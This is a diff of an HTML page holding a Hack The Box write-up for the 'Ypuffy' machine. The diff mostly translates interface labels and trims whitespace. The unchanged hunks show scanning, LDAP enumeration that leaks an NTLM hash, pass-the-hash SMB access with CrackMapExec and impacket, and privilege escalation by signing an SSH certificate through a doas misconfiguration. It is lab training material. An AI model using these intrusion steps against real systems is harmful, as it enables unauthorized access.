@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-  <title>HTB write-up: Ypuffy - xbytemx blog</title>
+  <title>HTB write-up: Ypuffy - xbytemx</title>
   <meta name="renderer" content="webkit" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 
@@ -57,7 +57,7 @@ Sin mas vamos con el write up&hellip;" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://xbytemx.github.io/post/htb_writeup_-_ypuffy/" />
 <meta property="article:published_time" content="2019-02-09T10:36:18-06:00"/>
-<meta property="article:modified_time" content="2019-02-09T10:36:18-06:00"/><meta property="og:site_name" content="xbytemx blog" />
+<meta property="article:modified_time" content="2019-02-09T10:36:18-06:00"/><meta property="og:site_name" content="xbytemx" />
 
 <meta itemprop="name" content="HTB write-up: Ypuffy">
 <meta itemprop="description" content="Sin duda una de las cosas que mas me gusta de HTB, es el hecho de tener un ecosistema tan variado que permite aprender en horizontales y verticales. Esta máquina me ayudo a conocer como funciona la generación de llaves de SSH a gran escala y como una mala configuración nos puede llevar a entregarle root a cualquier usuario. Tampoco conocía DOAS, pero se me hizo gracioso como fue relativamente fácil homologar lo aprendido de SUDO y RUNAS.
@@ -91,7 +91,7 @@ Sin mas vamos con el write up&hellip;"/>
 <body>
   <div id="mobile-navbar" class="mobile-navbar">
   <div class="mobile-header-logo">
-    <a href="/" class="logo">xbytemx blog</a>
+    <a href="/" class="logo">xbytemx</a>
   </div>
   <div class="mobile-navbar-icon">
     <span></span>
@@ -115,7 +115,7 @@ Sin mas vamos con el write up&hellip;"/>
   <div class="container" id="mobile-panel">
     <header id="header" class="header">
         <div class="logo-wrapper">
-  <a href="/" class="logo">xbytemx blog</a>
+  <a href="/" class="logo">xbytemx</a>
 </div>
 
 <nav class="site-navbar">
@@ -150,8 +150,8 @@ Sin mas vamos con el write up&hellip;"/>
               <a href="/categories/pentesting/"> pentesting </a>
             
           </div>
-        <span class="more-meta"> 2568 palabras </span>
-        <span class="more-meta"> 13 mins lectura </span>
+        <span class="more-meta"> 2568 words </span>
+        <span class="more-meta"> 13 mins read </span>
         
       </div>
     </header>
@@ -159,7 +159,7 @@ Sin mas vamos con el write up&hellip;"/>
     
     
 <div class="post-toc" id="post-toc">
-  <h2 class="post-toc-title">Contenidos</h2>
+  <h2 class="post-toc-title">Contents</h2>
   
   <div class="post-toc-content always-active">
     <nav id="TableOfContents">
@@ -217,7 +217,7 @@ Sin mas vamos con el write up&hellip;"/>
 
 <tbody>
 <tr>
-<td>SecNotes</td>
+<td>ypuffy</td>
 <td>AuxSarge</td>
 <td>Other</td>
 <td>10.10.10.107</td>
@@ -235,13 +235,13 @@ Sin mas vamos con el write up&hellip;"/>
 
 <p>Primero un nmap de todos los puertos, sin resolución de dns y un haciendo un TCP syn scan:</p>
 
-<pre><code>root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.107                                                                                  
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:16 CST                                                                        
-Initiating Ping Scan at 11:16                                                                                                          
-Scanning 10.10.10.107 [4 ports]                                                                                                        
-Completed Ping Scan at 11:16, 0.43s elapsed (1 total hosts)                                                                            
-Initiating SYN Stealth Scan at 11:16                                                                                                   
-Scanning 10.10.10.107 [65535 ports]                                       
+<pre><code>root@laptop:~# nmap -sS -p- --open -n -v 10.10.10.107
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-31 11:16 CST
+Initiating Ping Scan at 11:16
+Scanning 10.10.10.107 [4 ports]
+Completed Ping Scan at 11:16, 0.43s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 11:16
+Scanning 10.10.10.107 [65535 ports]
 Discovered open port 139/tcp on 10.10.10.107
 Discovered open port 445/tcp on 10.10.10.107
 Discovered open port 80/tcp on 10.10.10.107
@@ -272,37 +272,37 @@ Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-12-31 19:17:52 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
 Scanning 1 hosts [131072 ports/host]
-Discovered open port 139/tcp on 10.10.10.107                                   
-Discovered open port 445/tcp on 10.10.10.107                                   
-Discovered open port 80/tcp on 10.10.10.107                                    
-Discovered open port 22/tcp on 10.10.10.107                                    
+Discovered open port 139/tcp on 10.10.10.107
+Discovered open port 445/tcp on 10.10.10.107
+Discovered open port 80/tcp on 10.10.10.107
+Discovered open port 22/tcp on 10.10.10.107
 Discovered open port 389/tcp on 10.10.10.107
 </code></pre>
 
 <p>Observamos consistencia, por lo que continuamos a analizar los servicios y versiones en cada puerto:</p>
 
-<pre><code>root@laptop:~# nmap -p22,80,139,389,445 -sV -sC -n -v 10.10.10.107                                                                     
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 17:35 CST                                                                        
-NSE: Loaded 148 scripts for scanning.                                                                                                  
-NSE: Script Pre-scanning.                                                                                                              
-Initiating NSE at 17:35                                                                                                                
-Completed NSE at 17:35, 0.00s elapsed                                                                                                  
-Initiating NSE at 17:35                                                                                                                
-Completed NSE at 17:35, 0.00s elapsed                                                                                                  
-Initiating Ping Scan at 17:35                                                                                                          
-Scanning 10.10.10.107 [4 ports]                                                                                                        
-Completed Ping Scan at 17:35, 0.43s elapsed (1 total hosts)                                                                            
-Initiating SYN Stealth Scan at 17:35                                                                                                   
-Scanning 10.10.10.107 [5 ports]                                                                                                        
-Discovered open port 445/tcp on 10.10.10.107                                                                                           
-Discovered open port 22/tcp on 10.10.10.107                                                                                            
-Discovered open port 80/tcp on 10.10.10.107                                                                                            
+<pre><code>root@laptop:~# nmap -p22,80,139,389,445 -sV -sC -n -v 10.10.10.107
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 17:35 CST
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 17:35
+Completed NSE at 17:35, 0.00s elapsed
+Initiating NSE at 17:35
+Completed NSE at 17:35, 0.00s elapsed
+Initiating Ping Scan at 17:35
+Scanning 10.10.10.107 [4 ports]
+Completed Ping Scan at 17:35, 0.43s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 17:35
+Scanning 10.10.10.107 [5 ports]
+Discovered open port 445/tcp on 10.10.10.107
+Discovered open port 22/tcp on 10.10.10.107
+Discovered open port 80/tcp on 10.10.10.107
 Discovered open port 139/tcp on 10.10.10.107
 Discovered open port 389/tcp on 10.10.10.107
 Completed SYN Stealth Scan at 17:35, 0.43s elapsed (5 total ports)
 Initiating Service scan at 17:35
 Scanning 5 services on 10.10.10.107
-Completed Service scan at 17:36, 15.00s elapsed (5 services on 1 host)                                                                
+Completed Service scan at 17:36, 15.00s elapsed (5 services on 1 host)
 NSE: Script scanning 10.10.10.107.
 Initiating NSE at 17:36
 Completed NSE at 17:36, 12.88s elapsed
@@ -322,25 +322,25 @@ PORT    STATE SERVICE     VERSION
 389/tcp open  ldap        (Anonymous bind OK)
 445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
 Service Info: Host: YPUFFY
-                                                                                                                                      
+
 Host script results:
 |_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows 6.1 (Samba 4.7.6)
 |   Computer name: ypuffy
 |   NetBIOS computer name: YPUFFY\x00
 |   Domain name: hackthebox.htb
 |   FQDN: ypuffy.hackthebox.htb
 |_  System time: 2019-01-02T18:36:10-05:00
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: &lt;blank&gt;
 |   authentication\_level: user
 |   challenge\_response: supported
 |_  message_signing: disabled (dangerous, but default)
-| smb2-security-mode: 
-|   2.02: 
+| smb2-security-mode:
+|   2.02:
 |_    Message signing enabled but not required
-| smb2-time: 
+| smb2-time:
 |   date: 2019-01-02 17:36:10
 |_  start\_date: N/A
 
@@ -361,28 +361,28 @@ Nmap done: 1 IP address (1 host up) scanned in 29.32 seconds
 
 <p>Continuemos por enumerar el servicio de LDAP con el script de nmap:</p>
 
-<pre><code>root@laptop:~# nmap -p389 10.10.10.107 -sC -sV --script ldap-search                                                                    
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 18:24 CST                                                                        
-Nmap scan report for 10.10.10.107                                                                                                      
-Host is up (0.18s latency).                                                                                                            
-                                                                                                                                       
-PORT    STATE SERVICE VERSION                                                                                                          
-389/tcp open  ldap    (Anonymous bind OK)                                                                                              
-| ldap-search:                                                                                                                         
-|   Context: dc=hackthebox,dc=htb                                                                                                      
-|     dn: dc=hackthebox,dc=htb                                                                                                         
-|         dc: hackthebox                                                                                                               
-|         objectClass: top                                                                                                             
-|         objectClass: domain                                                                                                          
-|     dn: ou=passwd,dc=hackthebox,dc=htb                                                                                               
-|         ou: passwd                                                                                                                   
-|         objectClass: top                                                                                                             
-|         objectClass: organizationalUnit                                                                                              
-|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb                                                                                   
-|         uid: bob8791                                                                                                                 
-|         cn: Bob                                                                                                                      
-|         objectClass: account                                                                                                         
-|         objectClass: posixAccount                                                                                                    
+<pre><code>root@laptop:~# nmap -p389 10.10.10.107 -sC -sV --script ldap-search
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-02 18:24 CST
+Nmap scan report for 10.10.10.107
+Host is up (0.18s latency).
+
+PORT    STATE SERVICE VERSION
+389/tcp open  ldap    (Anonymous bind OK)
+| ldap-search:
+|   Context: dc=hackthebox,dc=htb
+|     dn: dc=hackthebox,dc=htb
+|         dc: hackthebox
+|         objectClass: top
+|         objectClass: domain
+|     dn: ou=passwd,dc=hackthebox,dc=htb
+|         ou: passwd
+|         objectClass: top
+|         objectClass: organizationalUnit
+|     dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
+|         uid: bob8791
+|         cn: Bob
+|         objectClass: account
+|         objectClass: posixAccount
 |         objectClass: top
 |         userPassword: {BSDAUTH}bob8791
 |         uidNumber: 5001
@@ -462,13 +462,13 @@ Nmap done: 1 IP address (1 host up) scanned in 13.79 seconds
 
 <p>Usemos estas credenciales ahora para enumerar el servicio de SMB:</p>
 
-<pre><code>(CrackMapExec-wTENtMaY) xbytemx@laptop:~/git/CrackMapExec$ crackmapexec smb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B -d ypuff 10.10.10.107 
+<pre><code>(CrackMapExec-wTENtMaY) xbytemx@laptop:~/git/CrackMapExec$ crackmapexec smb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B -d ypuff 10.10.10.107
 SMB         10.10.10.107    445    YPUFFY           [*] Windows 6.1 (name:YPUFFY) (domain:ypuff) (signing:False) (SMBv1:True)
-SMB         10.10.10.107    445    YPUFFY           [+] ypuff\alice1978 0B186E661BBDBDCF6047784DE8B9FD8B 
+SMB         10.10.10.107    445    YPUFFY           [+] ypuff\alice1978 0B186E661BBDBDCF6047784DE8B9FD8B
 
 (CrackMapExec-wTENtMaY) xbytemx@laptop:~/git/CrackMapExec$ crackmapexec smb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B -d ypuff 10.10.10.107 --shares
 SMB         10.10.10.107    445    YPUFFY           [*] Windows 6.1 (name:YPUFFY) (domain:ypuff) (signing:False) (SMBv1:True)
-SMB         10.10.10.107    445    YPUFFY           [+] ypuff\alice1978 0B186E661BBDBDCF6047784DE8B9FD8B 
+SMB         10.10.10.107    445    YPUFFY           [+] ypuff\alice1978 0B186E661BBDBDCF6047784DE8B9FD8B
 SMB         10.10.10.107    445    YPUFFY           [+] Enumerated shares
 SMB         10.10.10.107    445    YPUFFY           Share           Permissions     Remark
 SMB         10.10.10.107    445    YPUFFY           -----           -----------     ------
@@ -479,23 +479,23 @@ SMB         10.10.10.107    445    YPUFFY           IPC$                        
 <p>Vientos, ahora tenemos el acceso al directorio de ALICE, analicemos su contenido:</p>
 
 <pre><code>(impacket-a2aNp99x) xbytemx@laptop:~/git/impacket/examples$ python smbclient.py -hashes 00000000000000000000000000000000:0B186E661BBDBD
-CF6047784DE8B9FD8B YPUFF/alice1978@10.10.10.107                                                                                        
-Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies                                                                  
-                                                                                                                                       
-Type help for list of commands                                                                                                         
-# info                                                                                                                                 
-Version Major: 6                                                                                                                       
-Version Minor: 1                                                                                                                       
-Server Name: YPUFFY                                                                                                                    
-Server Comment: Samba Server                                                                                                           
-Server UserPath: C:\                                                                                                                   
-Simultaneous Users: 4294967295                                                                                                         
-# use alice                                                                                                                            
-# ls                                                                                                                                   
-drw-rw-rw-          0  Wed Jan  2 19:09:09 2019 .                                                                                      
-drw-rw-rw-          0  Tue Jul 31 22:16:50 2018 ..                                                                                     
--rw-rw-rw-       1460  Mon Jul 16 20:38:51 2018 my_private_key.ppk                                                                     
-# get my_private_key.ppk                                                                                                               
+CF6047784DE8B9FD8B YPUFF/alice1978@10.10.10.107
+Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
+
+Type help for list of commands
+# info
+Version Major: 6
+Version Minor: 1
+Server Name: YPUFFY
+Server Comment: Samba Server
+Server UserPath: C:\
+Simultaneous Users: 4294967295
+# use alice
+# ls
+drw-rw-rw-          0  Wed Jan  2 19:09:09 2019 .
+drw-rw-rw-          0  Tue Jul 31 22:16:50 2018 ..
+-rw-rw-rw-       1460  Mon Jul 16 20:38:51 2018 my_private_key.ppk
+# get my_private_key.ppk
 # exit
 </code></pre>
 
@@ -504,8 +504,8 @@ drw-rw-rw-          0  Tue Jul 31 22:16:50 2018 ..
 <p>Ok, tenemos un archivo ppk, que después de googlear, veremos que es un formato usado en putty para manera llaves, por lo que descomponemos el archivo para usarlo en openssh. Tras convertirlo, usemos la llave privada para acceder a la cuenta de alice:</p>
 
 <pre><code>xbytemx@laptop:~/htb/ypuff$ puttygen my_private_key.ppk -O private-openssh -o id_rsa-ypuff
-xbytemx@laptop:~/htb/ypuff$ chmod 600 id_rsa-ypuff 
-xbytemx@laptop:~/htb/ypuff$ ssh alice1978@10.10.10.107 -i id_rsa-ypuff 
+xbytemx@laptop:~/htb/ypuff$ chmod 600 id_rsa-ypuff
+xbytemx@laptop:~/htb/ypuff$ ssh alice1978@10.10.10.107 -i id_rsa-ypuff
 OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018
 
 Welcome to OpenBSD: The proactively secure Unix-like operating system.
@@ -516,7 +516,7 @@ version of the code.  With bug reports, please try to ensure that
 enough information to reproduce the problem is enclosed, and if a
 known fix for it exists, include that as well.
 
-ypuffy$ 
+ypuffy$
 </code></pre>
 
 <h1 id="cat-user-txt">cat user.txt</h1>
@@ -532,10 +532,10 @@ ypuffy$
 </blockquote>
 
 <pre><code>ypuffy$ cd /home/bob8791
-ypuffy$ ls -lah                                                                                                                        
-total 36                                                                                                                               
-drwxr-xr-x  3 bob8791  bob8791   512B Jul 30 20:52 .                                                                                   
-drwxr-xr-x  5 root     wheel     512B Jul 30 21:05 ..                                                                                  
+ypuffy$ ls -lah
+total 36
+drwxr-xr-x  3 bob8791  bob8791   512B Jul 30 20:52 .
+drwxr-xr-x  5 root     wheel     512B Jul 30 21:05 ..
 -rw-r--r--  1 bob8791  bob8791    87B Mar 24  2018 .Xdefaults
 -rw-r--r--  1 bob8791  bob8791   771B Mar 24  2018 .cshrc
 -rw-r--r--  1 bob8791  bob8791   101B Mar 24  2018 .cvsrc
@@ -555,7 +555,7 @@ drwxr-xr-x  3 bob8791  bob8791   512B Jul 30 20:52 ..
 
 <p>Interesante, sshauth.sql. Veamos en que consiste este archivo:</p>
 
-<pre><code>ypuffy$ strings sshauth.sql                                                                                                           
+<pre><code>ypuffy$ strings sshauth.sql
 CREATE TABLE principals (
         uid text,
         client cidr,
@@ -589,7 +589,7 @@ permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
 
 <p>¿Se acuerdan que aun teníamos el servicio TCP/80 sin enumerar? Pues bien, ya como alice podemos investigar un poco mas:</p>
 
-<pre><code>ypuffy$ cat /etc/httpd.conf 
+<pre><code>ypuffy$ cat /etc/httpd.conf
 server &quot;ypuffy.hackthebox.htb&quot; {
         listen on * port 80
 
@@ -619,10 +619,10 @@ ypuffy$
 <pre><code>ypuffy$ cat /etc/ssh/sshd_config  | grep -vE &quot;^#|^$&quot;
 PermitRootLogin prohibit-password
 AuthorizedKeysFile      .ssh/authorized_keys
-AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u                                              
+AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%u
 AuthorizedKeysCommandUser nobody
 TrustedUserCAKeys /home/userca/ca.pub
-AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u                                  
+AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%u
 AuthorizedPrincipalsCommandUser nobody
 PasswordAuthentication no
 ChallengeResponseAuthentication no
@@ -642,7 +642,7 @@ Subsystem       sftp    /usr/libexec/sftp-server
 
 <p>Como pudimos ver en el archivo de SSHd, las llaves de CA se encuentran en el home de userca:</p>
 
-<pre><code>ypuffy$ ls -lah /home/userca/                                                                                                                                                                
+<pre><code>ypuffy$ ls -lah /home/userca/
 total 44
 drwxr-xr-x  3 userca  userca   512B Jul 30  2018 .
 drwxr-xr-x  5 root    wheel    512B Jul 30  2018 ..
@@ -671,7 +671,7 @@ Enter file in which to save the key (/home/alice1978/.ssh/id_rsa): /tmp/.miu/meh
 Enter passphrase (empty for no passphrase):
 Enter same passphrase again:
 Your identification has been saved in /tmp/.miu/meh.
-Your public key has been saved in /tmp/.miu/meh.pub.                                                                                                                                                              
+Your public key has been saved in /tmp/.miu/meh.pub.
 The key fingerprint is:
 SHA256:h/p3lA1K73dZtbbhz3UhGChRcIZ7wMpilfHW1f2FCi0 alice1978@ypuffy.hackthebox.htb
 The key's randomart image is:
@@ -711,7 +711,7 @@ ypuffy$ chmod 777 meh.pub
 
 <p>Como hemos visto, el archivo de CA solo podía ser accedido por el usuario userca, por lo que tomando en cuenta las capacidades de DOAS, firmamos nuestro certificado para que tenga acceso a la misma zona de root.</p>
 
-<pre><code>ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I miau3 -n 3m3rgencyB4ckd00r -z 1 /tmp/.miu/meh.pub 
+<pre><code>ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I miau3 -n 3m3rgencyB4ckd00r -z 1 /tmp/.miu/meh.pub
 Signed user key /tmp/.miu/meh-cert.pub: id &quot;miau3&quot; serial 1 for 3m3rgencyB4ckd00r valid forever
 </code></pre>
 
@@ -730,7 +730,7 @@ version of the code.  With bug reports, please try to ensure that
 enough information to reproduce the problem is enclosed, and if a
 known fix for it exists, include that as well.
 
-ypuffy# id                                                                                                                                                                                                      
+ypuffy# id
 uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
 ypuffy# ls
 .Xdefaults .cache     .cshrc     .cvsrc     .login     .profile   root.txt
@@ -774,12 +774,12 @@ ypuffy# ls
           <a class="prev" href="/post/ioli-crackmes-cutter_-_crackme0x05/">
             <i class="iconfont icon-left"></i>
             <span class="prev-text nav-default">Reversing de IOLI Crackmes con Cutter - Crackme0x05</span>
-            <span class="prev-text nav-mobile">Previo</span>
+            <span class="prev-text nav-mobile">Prev</span>
           </a>
         
           <a class="next" href="/post/flareon2014_-_challenge05/">
             <span class="next-text nav-default">Flare-on 2014 - Challenge 05: 5get it</span>
-            <span class="next-text nav-mobile">Siguiente</span>
+            <span class="next-text nav-mobile">Next</span>
             <i class="iconfont icon-right"></i>
           </a>
       </nav>
@@ -816,11 +816,11 @@ ypuffy# ls
 
 <div class="copyright">
   <span class="power-by">
-    Creado con <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
   </span>
   <span class="division">|</span>
   <span class="theme-info">
-    Tema - 
+    Theme - 
     <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
   </span>
 
